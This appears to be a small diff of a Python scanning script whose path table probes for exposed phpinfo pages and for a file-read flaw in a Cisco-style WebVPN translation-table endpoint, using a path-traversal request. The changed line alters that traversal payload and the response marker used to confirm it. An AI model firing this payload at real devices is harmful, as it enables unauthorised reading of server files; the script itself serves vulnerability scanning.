@@ -16,7 +16,7 @@ paths = {
 paths = {
     '/phpinfo.php':'PHP Version',
     '/PI.php':'PHP Version',
-    '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/../../../../..//%2bCSCOE%2b/include/browser_inc.lua&default-language&lang=../':200
+    '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../':'dofile("'
         }
 
 def GO(host):
